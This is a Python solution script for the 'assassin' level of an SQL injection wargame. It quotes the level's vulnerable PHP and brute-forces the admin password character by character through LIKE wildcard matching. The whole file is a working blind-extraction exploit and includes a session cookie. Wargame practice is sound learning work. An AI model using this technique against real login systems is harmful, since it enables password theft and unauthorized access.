import requests
import time
import string
"""
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/\'/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_assassin where pw like '{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("assassin"); 
  highlight_file(__FILE__); 
?>
"""

url = "https://los.eagle-jump.org/assassin_bec1c90a48bc3a9f95fbf0c8ae8c88e1.php" 
password = ""
strings = string.printable
#payload = {"pw":"________"} # the underscore presents a single character
cookie = dict(PHPSESSID="tv814q1qgkcg3pg22pjgl9fc95")
for i in range(8):
    for j in strings:
        payload = {"pw": password + j + '_'* (7-len(password)) }
        cookie = dict(PHPSESSID="tv814q1qgkcg3pg22pjgl9fc95")
        r = requests.get(url,params=payload,cookies=cookie)
        #print(r.text)
        if 'Hello ' in r.text:
            password += j
            print("found {}".format(password))
            if len(password) == 8:
                payload = {"pw": password}
                r = requests.get(url,params=payload,cookies=cookie)
                if "Clear" in r.text:
                    print("clear")
                else:
                    print("try again")
            break
        time.sleep(0.5)
